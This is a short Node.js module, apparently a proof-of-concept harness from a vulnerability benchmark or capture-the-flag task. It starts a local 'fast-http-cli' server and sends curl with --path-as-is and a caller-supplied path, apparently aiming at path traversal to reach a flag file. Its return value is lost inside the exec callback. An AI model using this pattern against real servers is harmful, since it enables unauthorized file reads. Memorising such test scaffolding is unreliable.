const { exec } = require("child_process");
const { sleep } = require("sleep");

function exploitFunction(payload) {
    const path = require("path");
    const pathToFlag = path.resolve(__dirname, "../flag.html");

    let server = "node ./node_modules/fast-http-cli/fast-http.js -p 8892";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8892${payload}"`;
    exec(attack_string, (error, stdout) => {
        if (stdout) {
            return stdout;
        }
        return null;
    });
}

module.exports = { exploitFunction };